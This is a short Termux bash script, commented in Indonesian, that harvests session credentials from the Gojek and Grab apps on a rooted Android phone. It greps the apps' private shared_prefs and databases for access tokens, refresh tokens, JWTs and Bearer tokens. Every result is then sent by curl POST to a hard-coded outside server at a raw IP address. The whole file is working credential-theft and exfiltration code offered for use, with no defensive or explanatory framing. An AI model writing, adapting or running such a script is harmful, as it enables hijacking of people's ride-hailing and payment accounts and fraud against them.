#!/data/data/com.termux/files/usr/bin/bash
# harvest.sh — ambil token Gojek/Grab dari HP (root) + auto-kirim ke server. SATU PERINTAH.
SRV="http://161.120.180.21:9911/token"
OUT=$(mktemp)
{
echo "=== GOJEK ==="
GJ=/data/data/com.gojek.app
ls $GJ/shared_prefs/ 2>/dev/null | head -15
grep -rhoE '"(access_token|refresh_token|accessToken|auth_token)"[^<]{0,150}' $GJ/shared_prefs/*.xml 2>/dev/null | head -8
grep -rl 'eyJhbGci' $GJ/shared_prefs $GJ/databases 2>/dev/null | head -5
echo "--- full values ---"
grep -rhoE 'eyJhbGci[A-Za-z0-9._-]{50,400}' $GJ/shared_prefs $GJ/databases 2>/dev/null | sort -u | head -4
echo
echo "=== GRAB ==="
GB=/data/data/com.grabtaxi.passenger
ls $GB/shared_prefs/ 2>/dev/null | head -15
grep -rhoE '"(access_token|authToken|accessToken|refreshToken)"[^<]{0,150}' $GB/shared_prefs/*.xml 2>/dev/null | head -8
grep -rhoE 'eyJhbGci[A-Za-z0-9._-]{50,400}|Bearer [A-Za-z0-9._-]{30,300}' $GB/shared_prefs $GB/databases 2>/dev/null | sort -u | head -4
} > $OUT 2>&1

echo "=== HASIL ==="
cat $OUT
echo
echo "Mengirim ke server..."
curl -s -X POST -H "Content-Type: text/plain" --data-binary @$OUT $SRV && echo "TERKIRIM ✓ (lihat chat server)"
